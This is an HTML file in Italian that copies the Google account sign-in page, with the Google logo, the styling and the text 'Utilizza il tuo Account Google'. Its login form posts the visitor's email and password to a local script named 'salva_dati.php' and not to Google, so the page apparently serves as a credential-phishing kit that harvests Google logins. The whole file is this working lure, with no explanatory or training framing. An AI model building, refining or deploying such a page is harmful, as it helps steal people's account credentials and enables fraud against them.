<!DOCTYPE html>
<html lang="it">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Accedi - Account Google</title>
    <style>
        body {
            font-family: 'Roboto', arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f7f8f8;
            margin: 0;
        }

        .login-box {
            background: white;
            border: 1px solid #dadce0;
            padding: 40px;
            border-radius: 8px;
            width: 360px;
            text-align: center;
        }

        img {
            width: 75px;
            margin-bottom: 10px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 10px;
        }

        p {
            margin-bottom: 25px;
            color: #202124;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 13px;
            margin-bottom: 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }

        .btn {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 500;
            cursor: pointer;
            float: right;
        }

        .footer-links {
            clear: both;
            padding-top: 40px;
            font-size: 14px;
            color: #1a73e8;
            text-align: left;
        }
    </style>
</head>

<body>

    <div class="login-box">
        <img src="googlelogo.png" alt="Google">
        <h1>Accedi</h1>
        <p>Utilizza il tuo Account Google</p>

        <form action="salva_dati.php" method="POST">
            <input type="email" name="email" placeholder="Indirizzo email o numero di telefono" required>
            <input type="password" name="password" placeholder="Inserisci la tua password" required>

            <div style="text-align: left; color: #1a73e8; font-size: 14px; margin-bottom: 20px;">
                Password dimenticata?
            </div>

            <button type="submit" class="btn">Avanti</button>
        </form>
    </div>

</body>

</html>
